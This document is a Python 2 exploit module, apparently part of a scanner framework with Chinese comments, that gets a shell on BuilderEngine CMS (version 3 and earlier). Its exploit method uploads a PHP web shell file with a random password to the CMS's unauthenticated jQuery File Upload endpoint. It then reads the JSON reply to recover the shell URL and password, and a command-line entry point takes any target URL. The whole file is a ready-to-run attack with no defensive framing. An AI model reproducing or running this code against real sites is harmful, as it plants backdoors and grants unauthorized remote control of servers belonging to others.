#coding: utf-8

import os
import sys
import datetime
import re, urllib
import json
from exp_template import Exploit, Level, session, get_random_password

"""
构造函数需要传递以下参数:
url      要测试的目标
taskid   默认为0，当没有创建任务时使用
targetid 默认为0，当没有创建任务时使用

exp需要实现的方法为meta_info和exploit

"""
class builderengine_fileupload_getshell(Exploit):
    def meta_info(self):
        return {
            'name': 'builderengine_fileupload_getshell',
            'author': 'h',
            'date': '2018-03-09',
            'attack_type': 'GetShell',
            'app_type': 'CMS',              #路由器为Router
            'app_name': 'BuilderEngine',
            'min_version': '',
            'max_version': '3',
            'version_list': '',             #min_version,max_version 和 verion_list 二者必选其一
            'description': 'BuilderEngine文件上传GetShell',
            'reference':'',   #参考文档
            'cve':'',
        } 
        
    def exploit(self):
        if self.url == '' or (not self.url.startswith('http://') and not self.url.startswith('https://')):
            self.report('url error', Level.error)
            return
        for i in range(10):
            self.url = self.url.strip('/')
        target = "%s/themes/dashboard/assets/plugins/jquery-file-upload/server/php/" % (self.url)
        randpass = get_random_password()
        backdoor = {'files[]': ('%s.php'%get_random_password(), open('shell/shell01.php', 'rb').read().replace('__RANDPASS__', randpass))}
        req = session()
        try:        
            r = req.post(target, files=backdoor)
            tmp = json.loads(r.text)
            shell = urllib.unquote(tmp['files'][0]['url'])
            shell = shell.split('/files/')
            shell = self.url+'/files/'+shell[-1]
            #print shell, randpass
            self.shell_info(shell, randpass, 'php')            
        except Exception as e:
            print e
            pass
        
if __name__ == "__main__":
    if len(sys.argv) == 2:
        a = builderengine_fileupload_getshell(sys.argv[1])
        a.exploit()
    else:
        print '%s url' %  __file__
        print '%s http://192.168.1.11' %  __file__

